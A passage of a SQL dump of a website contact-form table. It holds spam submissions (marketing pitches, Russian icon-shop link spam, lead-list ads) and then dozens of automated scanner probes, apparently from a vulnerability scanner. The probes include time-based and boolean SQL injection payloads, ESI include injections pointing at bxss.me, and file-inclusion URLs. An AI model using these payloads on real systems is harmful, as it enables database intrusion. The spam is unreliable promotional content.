$489\r\n\r\n*All prices above are in USD and include a full script, voice-over and video.\r\n\r\nIf this is something you would like to discuss further, don\'t hesitate to reply.\r\n\r\nKind Regards,\r\nKellie'),
(7, 1675590896, NULL, 'Jekaskaf', 'ficonny2021@gmail.com', 'https://familyicon.ru', '83676318148', 'именная икона', '?????? \r\n \r\nОчень интересная тема про ??????. \r\nВот что я думаю уважаемый Moderator: \r\n \r\nhttps://nagoya-affiliate.com/page-809/?unapproved=371838&moderation-hash=8150865848813155d5abfc351ba1d021#comment-371838\r\nhttps://robamag.ru/callback/?id=&act=fastBack&SITE_ID=s1&name=Jekasrurdy&phone=81623997688&message=%D0%A1%D0%BF%D0%B5%D1%86%D0%BE%D0%B4%D0%B5%D0%B6%D0%B4%D0%B0+%D0%B2+%D1%80%D0%BE%D0%B7%D0%BD%D0%B8%D1%86%D1%83+%D0%B8+%D0%BE%D0%BF%D1%82%D0%BE%D0%BC+%D0%B2+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B5%2C+%D0%B7%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B8+%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D1%81%D0%BF%D0%B5%D1%86%D0%BE%D0%B4%D0%B5%D0%B6%D0%B4%D1%83%2C+%D1%86%D0%B5%D0%BD%D1%82%D1%80+%D0%BF%D1%80%D0%BE%D0%B8%D0%B7%D0%B2%D0%BE%D0%B4%D1%81%D1%82%D0%B2%D0%B5%D0%BD%D0%BD%D0%BE%D0%B9+%D1%81%D0%BF%D0%B5%D1%86%D0%BE%D0%B4%D0%B5%D0%B6%D0%B4%D1%8B.+%0D%0A+%0D%0A%D0%9E%D1%87%D0%B5%D0%BD%D1%8C+%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D0%B5%D1%81%D0%BD%D0%B0%D1%8F+%D1%82%D0%B5%D0%BC%D0%B0+%D0%BF%D1%80%D0%BE+%D0%A1%D0%BF%D0%B5%D1%86%D0%BE%D0%B4%D0%B5%D0%B6%D0%B4%D0%B0+%D0%B2+%D1%80%D0%BE%D0%B7%D0%BD%D0%B8%D1%86%D1%83+%D0%B8+%D0%BE%D0%BF%D1%82%D0%BE%D0%BC+%D0%B2+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B5%2C+%D0%B7%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B8+%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D1%81%D0%BF%D0%B5%D1%86%D0%BE%D0%B4%D0%B5%D0%B6%D0%B4%D1%83%2C+%D1%86%D0%B5%D0%BD%D1%82%D1%80+%D0%BF%D1%80%D0%BE%D0%B8%D0%B7%D0%B2%D0%BE%D0%B4%D1%81%D1%82%D0%B2%D0%B5%D0%BD%D0%BD%D0%BE%D0%B9+%D1%81%D0%BF%D0%B5%D1%86%D0%BE%D0%B4%D0%B5%D0%B6%D0%B4%D1%8B..+%0D%0A%D0%92%D0%BE%D1%82+%D1%87%D1%82%D0%BE+%D1%8F+%D0%B4%D1%83%D0%BC%D0%B0%D1%8E+%D1%83%D0%B2%D0%B0%D0%B6%D0%B0%D0%B5%D0%BC%D1%8B%D0%B9+Moderator%3A+%0D%0A+%0D%0A%D1%80%D1%83%D0%BA%D0%BE%D0%BF%D0%B8%D1%81%D0%BD%D1%8B%D0%B5+%D0%B8%D0%BA%D0%BE%D0%BD%D1%8B+%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fikony%2Fimennaya-ikona+%0D%0A%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B8%D0%BA%D0%BE%D0%BD%D1%83+%2B%D0%B2+%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B5%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B8%D0%BC%D0%B5%D0%BD%D0%BD%D1%83%D1%8E+%D0%B8%D0%BA%D0%BE%D0%BD%D1%83+%2B%D0%B2+%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B5%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B8%D0%BC%D0%B5%D0%BD%D0%BD%D1%83%D1%8E+%D0%B8%D0%BA%D0%BE%D0%BD%D1%83+%2B%D0%B2+%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B5%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fikony%2Fsemejnaya-ikona+%0D%0A+%0D%0A<a+href%3Dhttps%3A%2F%2Ffamilyicon.ru%2Fikony%2Fimennaya-ikona>%D1%80%D1%83%D0%BA%D0%BE%D0%BF%D0%B8%D1%81%D0%BD%D1%8B%D0%B5+%D0%B8%D0%BA%D0%BE%D0%BD%D1%8B+%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C<%2Fa>\r\nhttps://stuffbody.ru/callback/?id=&act=fastBack&SITE_ID=s1&name=JekasAcced&phone=81744331953&message=%D0%9E%D0%B1%D1%80%D0%B0%D1%82%D0%BD%D0%B0%D1%8F+%D1%81%D0%B2%D1%8F%D0%B7%D1%8C+%0D%0A+%0D%0A%D0%9E%D1%87%D0%B5%D0%BD%D1%8C+%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D0%B5%D1%81%D0%BD%D0%B0%D1%8F+%D1%82%D0%B5%D0%BC%D0%B0+%D0%BF%D1%80%D0%BE+%D0%9E%D0%B1%D1%80%D0%B0%D1%82%D0%BD%D0%B0%D1%8F+%D1%81%D0%B2%D1%8F%D0%B7%D1%8C.+%0D%0A%D0%92%D0%BE%D1%82+%D1%87%D1%82%D0%BE+%D1%8F+%D0%B4%D1%83%D0%BC%D0%B0%D1%8E+%D1%83%D0%B2%D0%B0%D0%B6%D0%B0%D0%B5%D0%BC%D1%8B%D0%B9+Admin%3A+%0D%0A+%0D%0A%D1%81%D0%B5%D0%BC%D0%B5%D0%B9%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%D1%85%D1%80%D0%B0%D0%BD%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%B8%D1%86%D0%B0%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A%D0%BD%D0%B0%D0%BF%D0%B8%D1%81%D0%B0%D1%82%D1%8C+%D0%B8%D0%BA%D0%BE%D0%BD%D1%83+%2B%D0%BD%D0%B0+%D0%B7%D0%B0%D0%BA%D0%B0%D0%B7%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fikony+%0D%0A%D0%B8%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fdlya-domashnej-molitvy+%0D%0A%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%BC%D0%B5%D1%80%D0%BD%D1%83%D1%8E+%D0%B8%D0%BA%D0%BE%D0%BD%D1%83%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A+%0D%0A<a+href%3Dhttps%3A%2F%2Ffamilyicon.ru%2Fpodarki>%D1%81%D0%B5%D0%BC%D0%B5%D0%B9%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%D1%85%D1%80%D0%B0%D0%BD%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%B8%D1%86%D0%B0<%2Fa>\r\nhttps://shop-panda.com/callback/?id=&act=fastBack&SITE_ID=s1&name=Jekaspag&phone=89254758438&message=%D0%9E%D0%B1%D1%80%D0%B0%D1%82%D0%BD%D0%B0%D1%8F+%D1%81%D0%B2%D1%8F%D0%B7%D1%8C+%0D%0A+%0D%0A%D0%9E%D1%87%D0%B5%D0%BD%D1%8C+%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D0%B5%D1%81%D0%BD%D0%B0%D1%8F+%D1%82%D0%B5%D0%BC%D0%B0+%D0%BF%D1%80%D0%BE+%D0%9E%D0%B1%D1%80%D0%B0%D1%82%D0%BD%D0%B0%D1%8F+%D1%81%D0%B2%D1%8F%D0%B7%D1%8C.+%0D%0A%D0%92%D0%BE%D1%82+%D1%87%D1%82%D0%BE+%D1%8F+%D0%B4%D1%83%D0%BC%D0%B0%D1%8E+%D1%83%D0%B2%D0%B0%D0%B6%D0%B0%D0%B5%D0%BC%D1%8B%D0%B9+Moderator%3A+%0D%0A+%0D%0A%D0%B8%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fikony%2Fmernaya-ikona+%0D%0A%D0%B8%D0%BA%D0%BE%D0%BD%D1%8B+%2B%D0%BD%D0%B0+%D1%81%D0%B2%D0%B0%D0%B4%D1%8C%D0%B1%D1%83%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fdlya-domashnej-molitvy+%0D%0A%D1%80%D1%83%D0%BA%D0%BE%D0%BF%D0%B8%D1%81%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%2B%D0%BD%D0%B0+%D0%B7%D0%B0%D0%BA%D0%B0%D0%B7%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fikony+%0D%0A%D0%BD%D0%B0%D0%BF%D0%B8%D1%81%D0%B0%D0%BD%D0%B8%D0%B5+%D0%B8%D0%BA%D0%BE%D0%BD+%2B%D0%BD%D0%B0+%D0%B7%D0%B0%D0%BA%D0%B0%D0%B7%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A+%0D%0A<a+href%3Dhttps%3A%2F%2Ffamilyicon.ru%2Fikony%2Fmernaya-ikona>%D0%B8%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B0<%2Fa>\r\nhttps://www.namebadgesinternational.ca/contact/?error=12&forename=JekasRoogs&surname=JekasRoogs&company=google&email=ficonny2021%40gmail.com&telephone=82993778977&enquiry=Contact+us+-+Name+Badges+International+%0D%0A+%0D%0A%D0%9E%D1%87%D0%B5%D0%BD%D1%8C+%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D0%B5%D1%81%D0%BD%D0%B0%D1%8F+%D1%82%D0%B5%D0%BC%D0%B0+%D0%BF%D1%80%D0%BE+Contact+us+-+Name+Badges+International.+%0D%0A%D0%92%D0%BE%D1%82+%D1%87%D1%82%D0%BE+%D1%8F+%D0%B4%D1%83%D0%BC%D0%B0%D1%8E+%D1%83%D0%B2%D0%B0%D0%B6%D0%B0%D0%B5%D0%BC%D1%8B%D0%B9+Moderator%3A+%0D%0A+%0D%0A%D1%87%D0%B5%D1%82%D0%BA%D0%B8+%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D1%81%D0%BB%D0%B0%D0%B2%D0%BD%D1%8B%D0%B5%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A%D0%B8%D0%BA%D0%BE%D0%BD%D1%8B+%2B%D0%BD%D0%B0+%D1%81%D0%B2%D0%B0%D0%B4%D1%8C%D0%B1%D1%83+%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fdlya-domashnej-molitvy+%0D%0A%D0%BC%D0%B5%D1%80%D0%BD%D0%B0%D1%8F+%D0%B8%D0%BA%D0%BE%D0%BD%D0%B0+%2B%D0%B4%D0%BB%D1%8F+%D0%BC%D0%BB%D0%B0%D0%B4%D0%B5%D0%BD%D1%86%D0%B0%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fikony+%0D%0A%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B8%D0%BA%D0%BE%D0%BD%D1%83+%2B%D0%B2+%D0%BC%D0%B0%D0%B3%D0%B0%D0%B7%D0%B8%D0%BD%D0%B5%3Ahttps%3A%2F%2Ffamilyicon.ru%2Fpodarki+%0D%0A+%0D%0A%3Ca+href%3Dhttps%3A%2F%2Ffamilyicon.ru%2Fpodarki%3E%D1%87%D0%B5%D1%82%D0%BA%D0%B8+%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D1%81%D0%BB%D0%B0%D0%B2%D0%BD%D1%8B%D0%B5%3C%2Fa%3E&source=Email\r\n \r\n \r\n \r\n \r\n<a href=https://familyicon.ru/dlya-domashnej-molitvy>именная икона</a>'),
(8, 1675900475, NULL, 'Stefanie', 'stefanie@megaleadstree.com', 'Hello, MegaLeadsTree.com is shutting down.\r\n\r\nWe have made available all our leads in 145 countries at a one-time fee.\r\n\r\nVisit us on MegaLeadsTree.com.', '01.23.08.51.50', 'MegaLeadsTree.com Shutting Down', 'Hello, MegaLeadsTree.com is shutting down.\r\n\r\nWe have made available all our leads in 145 countries at a one-time fee.\r\n\r\nVisit us on MegaLeadsTree.com.'),
(9, 1678478312, NULL, 'Suzanne', 'info@datalist2023.com', 'DataList2023.com presents all the new leads for you per country!\r\n\r\nVisit us on DataList2023.com', '02.89.82.22.41', 'DataList2023.com Updated Leads!', 'DataList2023.com presents all the new leads for you per country!\r\n\r\nVisit us on DataList2023.com'),
(10, 1679137223, NULL, 'Megan', 'meganjohnstones286@gmail.com', 'Hi there,\r\n\r\nWe run an Instagram growth service, which increases your number of followers both safely and practically. \r\n\r\n- We guarantee to gain you 400-1000+ followers per month.\r\n- People follow you because they are interested in you, increasing likes, comments and interaction.\r\n- All actions are made manually by our team. We do not use any \'bots\'.\r\n\r\nThe price is just $60 (USD) per month, and we can start immediately.\r\n\r\nIf you\'d like to see some of our previous work, let me know, and we can discuss it further.\r\n\r\nKind Regards,\r\nMegan', '(03) 5331 7079', 'Instagram Promotion: Grow your followers by 400-1200 each month', 'Hi there,\r\n\r\nWe run an Instagram growth service, which increases your number of followers both safely and practically. \r\n\r\n- Guaranteed: We guarantee to gain you 400-1200+ followers per month.\r\n- Real, human followers: People follow you because they are interested in your business or niche.\r\n- Safe: All actions are made manually. We do not use any bots.\r\n\r\nThe price is just $60 (USD) per month, and we can start immediately.\r\n\r\nIf you are interested, and would like to see some of our previous work, let me know and we can discuss further.\r\n\r\nKind Regards,\r\nMegan'),
(11, 1679623560, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(13, 1679623566, NULL, 'uFPKKsNb', 'sample@email.tst', 'contact', '555-666-0606', '1', '555'),
(14, 1679623569, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(15, 1679623573, NULL, 'uFPKKsNb', 'sample@email.tst', 'contact\0', '555-666-0606', '1', '555'),
(16, 1679623576, NULL, 'uFPKKsNb', 'sample@email.tst', 'Gb7B9jJX', '555-666-0606', '1', '555'),
(17, 1679623578, NULL, 'uFPKKsNb', 'sample@email.tst', 'contact/.', '555-666-0606', '1', '555'),
(18, 1679623581, NULL, 'uFPKKsNb', 'sample@email.tst', '-1 OR 2+65-65-1=0+0+0+1 -- ', '555-666-0606', '1', '555'),
(19, 1679623584, NULL, 'uFPKKsNb', 'sample@email.tst', '-1 OR 2+985-985-1=0+0+0+1', '555-666-0606', '1', '555'),
(20, 1679623587, NULL, 'uFPKKsNb', 'sample@email.tst', '-1\' OR 2+516-516-1=0+0+0+1 -- ', '555-666-0606', '1', '555'),
(21, 1679623590, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'contact'),
(22, 1679623593, NULL, 'uFPKKsNb', 'sample@email.tst', '-1\' OR 2+19-19-1=0+0+0+1 or \'lAb3Pmuv\'=\'', '555-666-0606', '1', '555'),
(23, 1679623596, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'contact\0'),
(24, 1679623599, NULL, 'uFPKKsNb', 'sample@email.tst', '-1\" OR 2+352-352-1=0+0+0+1 -- ', '555-666-0606', '1', '555'),
(25, 1679623602, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'contact/.'),
(26, 1679623605, NULL, 'uFPKKsNb', 'sample@email.tst', 'if(now()=sysdate(),sleep(15),0)', '555-666-0606', '1', '555'),
(27, 1679623608, NULL, 'contact', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(28, 1679623611, NULL, 'uFPKKsNb', 'sample@email.tst', '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '555-666-0606', '1', '555'),
(29, 1679623614, NULL, 'contact\0', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(30, 1679623617, NULL, 'uFPKKsNb', 'sample@email.tst', '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '555-666-0606', '1', '555'),
(31, 1679623620, NULL, 'contact/.', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(32, 1679623623, NULL, 'uFPKKsNb', 'sample@email.tst', '(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/', '555-666-0606', '1', '555'),
(33, 1679623627, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'contact', '1', '555'),
(34, 1679623629, NULL, 'uFPKKsNb', 'sample@email.tst', '-1; waitfor delay \'0:0:15\' -- ', '555-666-0606', '1', '555'),
(35, 1679623632, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'contact\0', '1', '555'),
(36, 1679623635, NULL, 'uFPKKsNb', 'sample@email.tst', '-1); waitfor delay \'0:0:15\' -- ', '555-666-0606', '1', '555'),
(37, 1679623638, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'contact/.', '1', '555'),
(38, 1679623641, NULL, 'uFPKKsNb', 'sample@email.tst', '1 waitfor delay \'0:0:15\' -- ', '555-666-0606', '1', '555'),
(39, 1679623644, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(40, 1679623647, NULL, 'uFPKKsNb', 'sample@email.tst', 'aUvElo7u\'; waitfor delay \'0:0:15\' -- ', '555-666-0606', '1', '555'),
(41, 1679623650, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(42, 1679623653, NULL, 'uFPKKsNb', 'sample@email.tst', '-5 OR 25=(SELECT 25 FROM PG_SLEEP(15))--', '555-666-0606', '1', '555'),
(43, 1679623656, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(44, 1679623658, NULL, 'uFPKKsNb', 'sample@email.tst', '-5) OR 850=(SELECT 850 FROM PG_SLEEP(15))--', '555-666-0606', '1', '555'),
(45, 1679623661, NULL, 'uFPKKsNb', 'sample@email.tst', '-1)) OR 884=(SELECT 884 FROM PG_SLEEP(15))--', '555-666-0606', '1', '555'),
(46, 1679623664, NULL, 'uFPKKsNb', 'sample@email.tst', 'lNVvm9Xj\' OR 559=(SELECT 559 FROM PG_SLEEP(15))--', '555-666-0606', '1', '555'),
(47, 1679623668, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'contact', '555'),
(48, 1679623670, NULL, 'uFPKKsNb', 'sample@email.tst', 'YltnYfw9\') OR 112=(SELECT 112 FROM PG_SLEEP(15))--', '555-666-0606', '1', '555'),
(49, 1679623674, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'contact\0', '555'),
(50, 1679623677, NULL, 'uFPKKsNb', 'sample@email.tst', '9upcbzCi\')) OR 972=(SELECT 972 FROM PG_SLEEP(15))--', '555-666-0606', '1', '555'),
(51, 1679623680, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'contact/.', '555'),
(52, 1679623683, NULL, 'uFPKKsNb', 'sample@email.tst', '555*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)', '555-666-0606', '1', '555'),
(53, 1679623686, NULL, 'uFPKKsNb', 'sample@email.tst', '555<esi:include src=\"http://bxss.me/rpb.png\"/>', '555-666-0606', '1', '555'),
(54, 1679623689, NULL, 'uFPKKsNb', 'sample@email.tst', '555\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '555-666-0606', '1', '555'),
(55, 1679623691, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555<esi:include src=\"http://bxss.me/rpb.png\"/>'),
(56, 1679623694, NULL, 'uFPKKsNb', 'sample@email.tst', '1\'\"', '555-666-0606', '1', '555'),
(57, 1679623697, NULL, 'uFPKKsNb<esi:include src=\"http://bxss.me/rpb.png\"/>', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(58, 1679623703, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606<esi:include src=\"http://bxss.me/rpb.png\"/>', '1', '555'),
(59, 1679623707, NULL, 'uFPKKsNb', 'sample@email.tst', '@@MsQ0h', '555-666-0606', '1', '555'),
(60, 1679623710, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(61, 1679623713, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(62, 1679623716, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(63, 1679623719, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(64, 1679623722, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1<esi:include src=\"http://bxss.me/rpb.png\"/>', '555'),
(65, 1679623725, NULL, 'uFPKKsNb', 'sample@email.tst', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '555-666-0606', '1', '555'),
(66, 1679623728, NULL, 'uFPKKsNb', 'sample@email.tst', '1some_inexistent_file_with_long_name\0.jpg', '555-666-0606', '1', '555'),
(67, 1679623732, NULL, 'uFPKKsNb', 'sample@email.tst', 'Http://bxss.me/t/fit.txt', '555-666-0606', '1', '555'),
(68, 1679623734, NULL, 'uFPKKsNb', 'sample@email.tst', 'http://bxss.me/t/fit.txt?.jpg', '555-666-0606', '1', '555'),
(69, 1679623737, NULL, 'uFPKKsNb', 'sample@email.tst', 'bxss.me', '555-666-0606', '1', '555'),
(70, 1679623741, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg'),
(71, 1679623743, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(72, 1679623746, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '1some_inexistent_file_with_long_name\0.jpg'),
(73, 1679623749, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(74, 1679623752, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'Http://bxss.me/t/fit.txt'),
(75, 1679623755, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'ok269E0y'),
(76, 1679623758, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'http://bxss.me/t/fit.txt?.jpg'),
(77, 1679623761, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1 OR 2+373-373-1=0+0+0+1 -- '),
(78, 1679623764, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'bxss.me'),
(79, 1679623767, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1 OR 2+347-347-1=0+0+0+1'),
(80, 1679623770, NULL, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(81, 1679623773, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1\' OR 2+94-94-1=0+0+0+1 -- '),
(82, 1679623776, NULL, '1some_inexistent_file_with_long_name\0.jpg', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(83, 1679623779, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1\' OR 2+276-276-1=0+0+0+1 or \'E5i15XKW\'=\''),
(84, 1679623782, NULL, 'Http://bxss.me/t/fit.txt', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(85, 1679623785, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1\" OR 2+563-563-1=0+0+0+1 -- '),
(86, 1679623788, NULL, 'http://bxss.me/t/fit.txt?.jpg', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(87, 1679623792, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'if(now()=sysdate(),sleep(15),0)'),
(88, 1679623794, NULL, 'bxss.me', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(89, 1679623797, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z'),
(90, 1679623800, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '1', '555'),
(91, 1679623803, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z'),
(92, 1679623806, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '1some_inexistent_file_with_long_name\0.jpg', '1', '555'),
(93, 1679623809, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/'),
(94, 1679623812, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'Http://bxss.me/t/fit.txt', '1', '555'),
(95, 1679623814, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1; waitfor delay \'0:0:15\' -- '),
(96, 1679623817, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'http://bxss.me/t/fit.txt?.jpg', '1', '555'),
(97, 1679623821, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1); waitfor delay \'0:0:15\' -- '),
(98, 1679623823, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'bxss.me', '1', '555'),
(99, 1679623826, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '1 waitfor delay \'0:0:15\' -- '),
(100, 1679623829, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(101, 1679623832, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'yX5v6tOB\'; waitfor delay \'0:0:15\' -- '),
(102, 1679623835, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(103, 1679623838, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-5 OR 861=(SELECT 861 FROM PG_SLEEP(15))--'),
(104, 1679623841, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(106, 1679623847, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(107, 1679623850, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '-1)) OR 879=(SELECT 879 FROM PG_SLEEP(15))--'),
(108, 1679623853, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(109, 1679623855, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'HPT0ZiwF\' OR 503=(SELECT 503 FROM PG_SLEEP(15))--'),
(110, 1679623858, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'pA3wDvmI\') OR 67=(SELECT 67 FROM PG_SLEEP(15))--'),
(111, 1679623861, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'EeP958Jb\')) OR 49=(SELECT 49 FROM PG_SLEEP(15))--'),
(112, 1679623864, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)'),
(113, 1679623868, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '555'),
(114, 1679623870, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\''),
(115, 1679623873, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1some_inexistent_file_with_long_name\0.jpg', '555'),
(116, 1679623876, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '1\'\"'),
(117, 1679623879, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'Http://bxss.me/t/fit.txt', '555'),
(118, 1679623885, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'http://bxss.me/t/fit.txt?.jpg', '555'),
